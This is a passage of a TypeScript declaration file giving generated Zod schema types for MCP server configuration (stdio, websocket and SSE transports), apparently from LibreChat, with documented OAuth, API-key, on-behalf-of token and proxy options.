        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"stdio">>;
    obo: z.ZodOptional<z.ZodUndefined>;
    /**
     * The executable to run to start the server.
     */
    command: z.ZodString;
    /**
     * Command line arguments to pass to the executable.
     */
    args: z.ZodArray<z.ZodString, "many">;
    /**
     * The environment to use when spawning the process.
     *
     * If not specified, the result of getDefaultEnvironment() will be used.
     * Environment variables can be referenced using ${VAR_NAME} syntax.
     */
    env: z.ZodEffects<z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>, Record<string, string> | undefined, Record<string, string> | undefined>;
    /**
     * How to handle stderr of the child process.
     * Accepts: 'pipe' | 'ignore' | 'inherit' | file descriptor number.
     * Defaults to "inherit".
     */
    stderr: z.ZodOptional<z.ZodUnion<[z.ZodEnum<["pipe", "ignore", "inherit"]>, z.ZodNumber]>>;
}, "strip", z.ZodTypeAny, {
    type: "stdio";
    command: string;
    args: string[];
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    env?: Record<string, string> | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
    stderr?: number | "pipe" | "ignore" | "inherit" | undefined;
}, {
    command: string;
    args: string[];
    type?: "stdio" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    env?: Record<string, string> | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
    stderr?: number | "pipe" | "ignore" | "inherit" | undefined;
}>, z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"websocket">>;
    obo: z.ZodOptional<z.ZodUndefined>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "websocket";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
}, {
    url: string;
    type?: "websocket" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
}>, z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"sse">>;
    headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * On-Behalf-Of (OBO) token exchange configuration.
     * When configured, LibreChat exchanges the logged-in user's federated access token
     * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
     * The exchanged token is injected as a Bearer Authorization header automatically.
     * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
     */
    obo: z.ZodOptional<z.ZodObject<{
        /** Scopes to request for the downstream MCP server (e.g., "api://<client-id>/Mcp.Tools.ReadWrite") */
        scopes: z.ZodString;
    }, "strip", z.ZodTypeAny, {
        scopes: string;
    }, {
        scopes: string;
    }>>;
    /** Optional outbound proxy URL for this remote MCP transport */
    proxy: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "sse";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}, {
    url: string;
    type?: "sse" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}>, z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
